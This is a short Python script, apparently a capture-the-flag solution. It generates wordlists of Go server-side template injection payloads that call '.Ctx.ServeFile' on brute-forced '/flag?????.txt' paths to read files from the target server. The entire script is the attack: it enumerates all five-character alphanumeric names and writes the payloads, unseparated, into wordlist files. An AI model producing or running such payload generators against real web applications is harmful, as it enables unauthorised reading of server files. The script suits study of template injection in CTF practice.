i = 1
file_counter = 1

for a in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
    for b in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
        for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
            for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
                for e in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
                    payload = '{{ .Ctx.ServeFile "/flag' + a + b + c + d + e + '.txt" }}'
                    with open(f"wordlist_{file_counter}.txt", "a") as f:
                        f.write(payload)
                        if i % 10000 == 0:
                            f.close()
                            file_counter += 1
                        i += 1


                    